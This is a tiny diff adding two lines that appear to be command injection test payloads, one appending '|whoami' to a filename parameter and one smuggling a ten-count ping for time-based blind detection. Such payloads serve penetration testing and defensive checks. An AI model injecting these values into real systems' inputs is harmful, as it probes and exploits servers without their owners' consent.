@@ -1,0 +1,2 @@
+Simplecase:  --->   filename=subham.txt|whoami
+TimeDelay:   --->   filename=subham.txt|||ping+-c+10+127.0.0.1||
